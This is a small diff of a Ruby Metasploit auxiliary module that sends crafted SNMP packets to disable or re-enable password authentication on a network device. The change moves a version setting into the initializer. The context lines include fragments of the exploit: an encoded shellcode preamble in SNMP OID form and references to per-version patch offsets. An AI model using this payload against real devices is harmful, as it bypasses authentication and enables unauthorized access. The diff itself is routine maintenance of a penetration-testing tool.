@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Auxiliary
       OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', 'pass-disable', ['pass-disable', 'pass-enable']])
     ], self.class)
     deregister_options("VERSION")
+    datastore['VERSION'] = '2c' # 2c required it seems
 
     @offsets = {
 
@@ -70,8 +71,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    datastore['VERSION'] = '2c' # 2c required it seems
-
     snmp = connect_snmp
     begin
       vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
@@ -98,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
           pmcheck_bytes = @offsets[vers_string][5]
           admauth_bytes = @offsets[vers_string][8]
       end
-      
+
       preamble_snmp = ""
       preamble_snmp << "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
       preamble_snmp << @offsets[vers_string][3]
@@ -136,7 +135,6 @@ class MetasploitModule < Msf::Auxiliary
   def run()
 
     begin
-      datastore['VERSION'] = '2c' # 2c required it seems
       mode = datastore['MODE']
 
       session = rand(255) + 1
